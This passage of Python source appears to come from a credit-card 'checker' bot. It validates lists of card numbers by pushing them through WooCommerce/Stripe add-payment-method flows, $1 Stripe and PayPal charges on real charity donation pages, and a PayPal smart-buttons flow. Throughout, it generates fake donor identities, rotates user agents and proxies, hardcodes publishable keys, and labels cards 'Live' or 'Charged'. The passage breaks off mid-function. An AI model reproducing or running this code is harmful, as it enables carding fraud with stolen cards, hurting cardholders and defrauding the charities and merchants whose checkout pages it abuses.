            'approved', 'success', 'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

        if 'otp_required' in response_lower or '3d_secure' in response_lower:
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        if 'ds_required' in response_lower or status_lower in ('ds_required', '3ds_required'):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        ds_required_match = re.search(r'(?<!\w)ds_required\s*[:=]\s*true\b', response_lower)
        if ds_required_match:
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

        if 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'shopiii', 'price': '-'}

# ================== STRIPE AUTH ==================
def getvalue(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

async def process_stripe_auth_card(card_data, proxy_url=None):
    site_url = STRIPE_AUTH_SITE
    try:
        if not site_url.startswith('http'):
            site_url = 'https://' + site_url
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(site_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = generate_random_email()
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9', 'user-agent': UserAgent().random}
            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
            resp_text = await resp.text()
            register_nonce = (getvalue(resp_text, 'woocommerce-register-nonce" value="', '"') or 
                             getvalue(resp_text, 'id="woocommerce-register-nonce" value="', '"') or 
                             getvalue(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
            if register_nonce:
                username = email.split('@')[0]
                password = f"Pass{random.randint(100000, 999999)}!"
                register_data = {
                    'email': email,
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': site_url,
                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'wc_order_attribution_session_pages': '1',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': headers['user-agent'],
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register'
                }
                reg_resp = await session.post(site_url, headers=headers, data=register_data, proxy=proxy_url)
                reg_text = await reg_resp.text()
                if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
                    resp = await session.get(site_url, headers=headers, proxy=proxy_url)
                    resp_text = await resp.text()
                    login_nonce = getvalue(resp_text, 'woocommerce-login-nonce" value="', '"')
                    if login_nonce:
                        login_data = {'username': username, 'password': password, 'woocommerce-login-nonce': login_nonce, 'login': 'Log in'}
                        await session.post(site_url, headers=headers, data=login_data, proxy=proxy_url)
            add_payment_url = site_url.rstrip('/') + '/add-payment-method/'
            if '/my-account/add-payment-method' not in add_payment_url:
                add_payment_url = f"{domain}/my-account/add-payment-method/"
            headers = {'user-agent': UserAgent().random}
            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
            payment_page_text = await resp.text()
            add_card_nonce = (getvalue(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
                             getvalue(payment_page_text, 'add_card_nonce":"', '"') or 
                             getvalue(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or 
                             getvalue(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
            stripe_key = (getvalue(payment_page_text, '"key":"pk_', '"') or 
                         getvalue(payment_page_text, 'data-key="pk_', '"') or 
                         getvalue(payment_page_text, 'stripe_key":"pk_', '"') or 
                         getvalue(payment_page_text, 'publishable_key":"pk_', '"'))
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key
            stripe_headers = {
                'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': UserAgent().random
            }
            stripe_data = {
                'type': 'card', 'card[number]': card_data['number'], 'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'], 'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified', 'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                'referrer': domain, 'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(), 'muid': generate_guid(), 'sid': generate_guid(),
                'key': stripe_key, '_stripe_version': '2024-06-20'
            }
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
            pm_json = await pm_resp.json()
            if 'error' in pm_json:
                return False, pm_json['error']['message']
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, 'Failed to create Payment Method'
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain, 'x-requested-with': 'XMLHttpRequest', 'user-agent': UserAgent().random
            }
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}}
            ]
            for endp in endpoints:
                if not add_card_nonce:
                    continue
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                endp['data']['wc-stripe-payment-type'] = 'card'
                try:
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
                    text = await res.text()
                    if 'success' in text:
                        js = json.loads(text)
                        if js.get('success'):
                            status = js.get('data', {}).get('status')
                            return True, f"Approved (Status: {status})"
                        else:
                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            return False, error_msg
                except:
                    continue
            return False, 'Confirmation failed on site'
    except Exception as e:
        return False, f'System Error: {str(e)}'

async def check_stripe_auth_card(cc_str: str, proxy: str = None):
    card_data_parsed = parse_cc(cc_str)
    if not card_data_parsed:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'Stripe Auth', 'card': cc_str}
    card_data = {
        'number': card_data_parsed['number'],
        'exp_month': card_data_parsed['mm'],
        'exp_year': card_data_parsed['yy'][-2:],
        'cvc': card_data_parsed['cvc']
    }
    is_approved, response_msg = await process_stripe_auth_card(card_data, proxy_url=proxy)
    if is_approved or 'requires_action' in response_msg.lower() or 'succeeded' in response_msg.lower():
        return {'status': 'APPROVED', 'message': response_msg, 'gateway': 'Stripe Auth', 'card': cc_str}
    else:
        return {'status': 'DECLINED', 'message': response_msg, 'gateway': 'Stripe Auth', 'card': cc_str}

# ================== STRIPE DONATION ==================
async def check_stripe_donation_card(cc_str: str):
    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'Stripe Donation', 'price': '$1.00', 'card': cc_str}
    first_names = ['willam','james','john','robert','michael']
    last_names = ['dives','smith','johnson','brown','jones']
    first = random.choice(first_names)
    last = random.choice(last_names)
    email = f"{first}{random.randint(1000,99999)}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}"
    ua = UserAgent()
    async with aiohttp.ClientSession() as session:
        stripe_url = "https://api.stripe.com/v1/payment_methods"
        stripe_data = {
            'type': 'card', 'billing_details[name]': f"{first} {last}", 'billing_details[email]': email,
            'card[number]': card['number'], 'card[cvc]': card['cvc'], 'card[exp_month]': card['mm'],
            'card[exp_year]': card['yy'][-2:], 'guid': str(uuid.uuid4()), 'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()), 'payment_user_agent': 'stripe.js/67c5b8132f; stripe-js-v3/67c5b8132f; split-card-element',
            'referrer': 'https://www.forechrist.com', 'key': STRIPE_DONATION_KEY,
        }
        try:
            headers = {'User-Agent': ua.random}
            async with session.post(stripe_url, data=stripe_data, headers=headers) as resp:
                if resp.status != 200:
                    return {'status': 'ERROR', 'message': f'Stripe API error ({resp.status})', 'gateway': 'Stripe Donation', 'card': cc_str}
                pm_json = await resp.json()
            if 'error' in pm_json:
                error_msg = pm_json['error'].get('message','')
                if 'declined' in error_msg.lower():
                    return {'status': 'DECLINED', 'message': 'Your card was declined', 'gateway': 'Stripe Donation', 'card': cc_str}
                else:
                    return {'status': 'ERROR', 'message': error_msg, 'gateway': 'Stripe Donation', 'card': cc_str}
            pm_id = pm_json['id']
        except Exception as e:
            return {'status': 'ERROR', 'message': f'Stripe request failed: {str(e)}', 'gateway': 'Stripe Donation', 'card': cc_str}
        ajax_url = "https://www.forechrist.com/wp-admin/admin-ajax.php"
        reset_nonce_data = {'action': 'give_donation_form_reset_all_nonce', 'give_form_id': '31358'}
        try:
            async with session.post(ajax_url, data=reset_nonce_data, headers=headers) as resp:
                if resp.status == 200:
                    reset_json = await resp.json()
                    form_hash = reset_json.get('data',{}).get('give_form_hash','7cce7c4e02')
                else:
                    form_hash = '7cce7c4e02'
        except:
            form_hash = '7cce7c4e02'
        final_url = "https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/?payment-mode=stripe&form-id=31358"
        donation_data = {
            'give-fee-amount': '0.34', 'give-fee-mode-enable': 'false', 'give-fee-status': 'enabled',
            'give-honeypot': '', 'give-form-id-prefix': '31358-1', 'give-form-id': '31358',
            'give-form-title': 'Dress a Student – Second Round of Donations',
            'give-current-url': 'https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/',
            'give-form-url': 'https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/',
            'give-form-minimum': '1', 'give-form-maximum': '1000000', 'give-form-hash': form_hash,
            'give-price-id': '0', 'give-recurring-logged-in-only': '', 'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0', 'give-amount': '1', 'give_stripe_payment_method': pm_id,
            'payment-mode': 'stripe', 'give_first': first, 'give_last': last, 'give_email': email,
            'card_name': f"{first} {last}", 'give_action': 'purchase', 'give-gateway': 'stripe'
        }
        try:
            async with session.post(final_url, data=donation_data, headers=headers, allow_redirects=True) as resp:
                response_text = await resp.text()
        except Exception as e:
            return {'status': 'ERROR', 'message': f'Donation submission failed: {str(e)}', 'gateway': 'Stripe Donation', 'card': cc_str}
        if "Payment Complete: Thank you for your donation" in response_text or "Donation Receipt" in response_text:
            receipt_match = re.search(r"Donation ID\s+([\d]+)", response_text)
            receipt_id = receipt_match.group(1) if receipt_match else "00193"
            return {'status': 'CHARGED', 'message': f'Thank you! Donation ID {receipt_id}', 'gateway': 'Stripe Donation', 'price': '$1.00', 'card': cc_str}
        elif "Your card was declined" in response_text or "card_declined" in response_text:
            return {'status': 'DECLINED', 'message': 'Your card was declined', 'gateway': 'Stripe Donation', 'card': cc_str}
        elif "3d_secure" in response_text.lower():
            return {'status': '3DS_REQUIRED', 'message': '3D Secure required', 'gateway': 'Stripe Donation', 'card': cc_str}
        elif "insufficient funds" in response_text.lower():
            return {'status': 'LIVE', 'message': 'Insufficient funds (card is live)', 'gateway': 'Stripe Donation', 'card': cc_str}
        else:
            return {'status': 'DECLINED', 'message': 'Transaction declined', 'gateway': 'Stripe Donation', 'card': cc_str}

# ================== PAYPAL CHECKER ==================
async def check_paypal_card(cc_str: str, proxy: dict = None) -> dict:
    import re, random, requests, json
    from typing import Optional, Dict

    def parse_cc(cc_str: str) -> Optional[Dict[str, str]]:
        parts = re.split(r'[|:,]', cc_str.strip())
        if len(parts) >= 4:
            cc = parts[0].strip()
            mm = parts[1].strip().zfill(2)
            yy = parts[2].strip()
            cvv = parts[3].strip()
            if len(yy) == 2:
                yy = "20" + yy
            return {"number": cc, "mm": mm, "yy": yy, "cvc": cvv}
        return None

    FIRST_NAMES = ["James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda","William","Elizabeth"]
    LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
    ADDRESSES = [{"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "zip": "62704"},
                 {"line1": "123 Maple Street", "city": "Anytown", "state": "NY", "zip": "10001"}]
    PHONE_PREFIXES = ["212","310","312"]
    EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com"]

    def random_donor():
        first = random.choice(FIRST_NAMES)
        last = random.choice(LAST_NAMES)
        addr = random.choice(ADDRESSES)
        phone = random.choice(PHONE_PREFIXES) + ''.join(str(random.randint(0,9)) for _ in range(7))
        email = f"{first.lower()}{random.randint(10,9999)}@{random.choice(EMAIL_DOMAINS)}"
        return {"first": first, "last": last, "email": email, "phone": phone, "address": addr}

    def detect_type(n: str) -> str:
        n = n.replace(" ", "").replace("-", "")
        if n.startswith("4"): return "VISA"
        if re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n): return "MASTER_CARD"
        if n.startswith(("34", "37")): return "AMEX"
        if n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n): return "DISCOVER"
        return "VISA"

    def charge_sync(cc_num: str, mm: str, yy: str, cvv: str, proxy_str: str = None) -> dict:
        try:
            donor = random_donor()
            session = requests.Session()
            session.verify = True
            if proxy_str:
                if proxy_str.count(':') == 3 and '@' not in proxy_str:
                    p = proxy_str.split(':')
                    fmt = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
                    session.proxies = {"http": fmt, "https": fmt}
                elif '@' in proxy_str:
                    session.proxies = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
                else:
                    session.proxies = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
            ajax_headers = {"User-Agent": ua, "Accept": "*/*", "Origin": "https://awwatersheds.org",
                           "Referer": "https://awwatersheds.org/donate/", "X-Requested-With": "XMLHttpRequest"}
            r = session.get("https://awwatersheds.org/donate/", headers={"User-Agent": ua}, timeout=20)
            if r.status_code != 200:
                return {"status": "ERROR", "msg": f"Page fetch failed: {r.status_code}"}
            html = r.text
            h = re.search(r'name="give-form-hash" value="(.*?)"', html)
            if not h:
                h = re.search(r'"base_hash":"(.*?)"', html)
            if not h:
                return {"status": "ERROR", "msg": "Hash not found"}
            tokens = {"hash": h.group(1), "pfx": re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1),
                     "id": re.search(r'name="give-form-id" value="(.*?)"', html).group(1)}
            reg_data = {
                "give-honeypot": "", "give-form-id-prefix": tokens['pfx'], "give-form-id": tokens['id'],
                "give-form-title": "Sustainers Circle", "give-current-url": "https://awwatersheds.org/donate/",
                "give-form-url": "https://awwatersheds.org/donate/", "give-form-hash": tokens['hash'],
                "give-price-id": "custom", "give-amount": "1.00", "payment-mode": "paypal-commerce",
                "give_first": donor["first"], "give_last": donor["last"], "give_email": donor["email"],
                "give-lake-affiliation": "Other", "give_action": "purchase", "give-gateway": "paypal-commerce",
                "action": "give_process_donation", "give_ajax": "true"
            }
            r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=ajax_headers, data=reg_data, timeout=20)
            order_data = {
                "give-honeypot": "", "give-form-id-prefix": tokens['pfx'], "give-form-id": tokens['id'],
                "give-form-hash": tokens['hash'], "payment-mode": "paypal-commerce", "give-amount": "1.00",
                "give-gateway": "paypal-commerce"
            }
            r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php",
                             params={"action": "give_paypal_commerce_create_order"},
                             headers=ajax_headers, data=order_data, timeout=20)
            if r.status_code != 200 or not r.text:
                return {"status": "ERROR", "msg": "Order creation failed: empty response"}
            try:
                order_json = r.json()
            except:
                return {"status": "ERROR", "msg": f"Order creation JSON decode error: {r.text[:100]}"}
            if not order_json.get("success"):
                return {"status": "ERROR", "msg": f"Order creation failed: {order_json}"}
            order_id = order_json["data"]["id"]
            full_yy = yy if len(yy) == 4 else f"20{yy}"
            addr = donor["address"]
            billing = {"givenName": donor["first"], "familyName": donor["last"], "line1": addr["line1"],
                      "line2": None, "city": addr["city"], "state": addr["state"], "postalCode": addr["zip"], "country": "US"}
            shipping = billing.copy()
            graphql_headers = {"Host": "www.paypal.com", "Paypal-Client-Context": order_id,
                              "X-App-Name": "standardcardfields", "Paypal-Client-Metadata-Id": order_id,
                              "User-Agent": ua, "Content-Type": "application/json", "Origin": "https://www.paypal.com",
                              "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}", "X-Country": "US"}
            query = """
            mutation payWithCard($token: String! $card: CardInput $firstName: String $lastName: String $billingAddress: AddressInput $email: String $shippingAddress: AddressInput) {
                approveGuestPaymentWithCreditCard(token: $token card: $card firstName: $firstName lastName: $lastName email: $email billingAddress: $billingAddress shippingAddress: $shippingAddress) {
                    flags { is3DSecureRequired }
                    cart { intent cartId }
                }
            }
            """
            variables = {
                "token": order_id,
                "card": {"cardNumber": cc_num, "type": detect_type(cc_num), "expirationDate": f"{mm}/{full_yy}",
                        "postalCode": addr["zip"], "securityCode": cvv},
                "firstName": donor["first"], "lastName": donor["last"], "email": donor["email"],
                "billingAddress": billing, "shippingAddress": shipping
            }
            r = requests.post("https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
                             headers=graphql_headers, json={"query": query, "variables": variables}, timeout=30)
            paypal_text = r.text
            approve_data = {
                "give-honeypot": "", "give-form-id-prefix": tokens['pfx'], "give-form-id": tokens['id'],
                "give-form-hash": tokens['hash'], "payment-mode": "paypal-commerce", "give-amount": "1.00",
                "give-gateway": "paypal-commerce"
            }
            r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php",
                             params={"action": "give_paypal_commerce_approve_order", "order": order_id},
                             headers=ajax_headers, data=approve_data, timeout=30)
            t = paypal_text.upper()
            if 'APPROVESTATE":"APPROVED' in t or ('PARENTTYPE":"AUTH' in t and '"CARTID"' in t):
                return {"status": "CHARGED", "msg": "Payment Approved!"}
            if '"APPROVEGUESTPAYMENTWITHCREDITCARD"' in t and '"ERRORS"' not in t and '"CARTID"' in t:
                return {"status": "CHARGED", "msg": "Charged!"}
            if 'CVV2_FAILURE' in t or 'INVALID_SECURITY_CODE' in t:
                return {"status": "APPROVED", "msg": "CVV mismatch (Live)"}
            if 'INVALID_BILLING_ADDRESS' in t:
                return {"status": "APPROVED", "msg": "AVS failure (Live)"}
            if 'EXISTING_ACCOUNT_RESTRICTED' in t:
                return {"status": "APPROVED", "msg": "Account restricted (Live)"}
            if 'INSUFFICIENT_FUNDS' in t:
                return {"status": "APPROVED", "msg": "Insufficient funds (Live)"}
            combined = (paypal_text + " " + r.text).upper()
            declines = [('DO_NOT_HONOR','Do Not Honor'), ('ACCOUNT_CLOSED','Account Closed'),
                       ('LOST_OR_STOLEN','Lost/Stolen'), ('EXPIRED_CARD','Expired'), ('GENERIC_DECLINE','Declined')]
            for kw, msg in declines:
                if kw in combined:
                    return {"status": "DECLINED", "msg": msg}
            try:
                rj = json.loads(paypal_text)
                if "errors" in rj:
                    return {"status": "DECLINED", "msg": rj["errors"][0].get("message", "Unknown")}
            except:
                pass
            return {"status": "DECLINED", "msg": "Transaction declined"}
        except Exception as e:
            return {"status": "ERROR", "msg": str(e)[:100]}

    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'PayPal $1', 'price': '$1.00', 'card': cc_str}
    proxy_str = None
    if proxy and isinstance(proxy, dict):
        http_proxy = proxy.get("http")
        if http_proxy:
            proxy_str = http_proxy.split("://", 1)[-1] if "://" in http_proxy else http_proxy
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, charge_sync, card['number'], card['mm'], card['yy'], card['cvc'], proxy_str)
    status_map = {"CHARGED": "CHARGED", "APPROVED": "APPROVED", "DECLINED": "DECLINED", "ERROR": "ERROR", "LIVE": "APPROVED"}
    final_status = status_map.get(result["status"], "DECLINED")
    return {'status': final_status, 'message': result["msg"], 'gateway': 'PayPal $1', 'price': '$1.00', 'card': cc_str}

# ================== PAYPAL2 CHECKER ==================
async def check_paypal2_card(cc_str: str, proxy: dict = None):
    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'PayPal2', 'price': '$0.01', 'card': cc_str}
    cc = card['number']
    mes = card['mm']
    ano = card['yy'][-2:]
    cvv = card['cvc']
    try:
        from httpx import AsyncClient
        async with AsyncClient(follow_redirects=True, verify=False, proxy=proxy) as session:
            head = {"Host": "www.paypal.com", "referer": "https://ghcop.org/"}
            r = await session.get(
                "https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVJZZHZfdkROTTJpNGJJSXA2QXNuVDduQmNTdWtZRExJLWdoZ2JiaC0xVi05OEZ2eVR2NERySU1IaS1KUm9peFRLdjMyMXJzalZGeVRhTWYmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=ARYdv_vDNM2i4bIIp6AsnT7nBcSukYDLI-ghgbbh-1V-98FvyTv4DrIMHi-JRoixTKv321rsjVFyTaMf&sdkCorrelationID=f308033f5c550&storageID=uid_6a9b3f40f6_mtg6ntc6ntk&sessionID=uid_32896bb77a_mtg6ntc6ntk&buttonSessionID=uid_98c2d6c744_mtg6ntc6ntk&env=production&buttonSize=medium&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImhpcGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImpjYiI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX19LCJndWVzdEVuYWJsZWQiOmZhbHNlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&platform=mobile&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&allowBillingPayments=true&disableSetCookie=false",
                headers=head,)
            token_match = re.search(r'"facilitatorAccessToken":"([^"]+)"', r.text)
            if not token_match:
                return {'status': 'ERROR', 'message': 'Token not found', 'gateway': 'PayPal2', 'price': '$0.01', 'card': cc_str}
            token = unescape(token_match.group(1))
            head2 = {"content-type": "application/json", "authorization": f"Bearer {token}",
